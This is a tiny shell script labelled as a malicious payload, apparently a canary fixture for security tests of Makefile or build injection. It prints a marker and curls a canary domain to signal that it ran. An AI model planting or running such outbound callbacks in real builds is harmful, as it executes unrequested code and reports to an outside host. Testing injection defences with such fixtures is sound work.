# Malicious payload file
echo "Payload executed: hb-makefile-payload"
curl -s https://canary.domain/hb-makefile-payload || echo "curl failed"
exit 0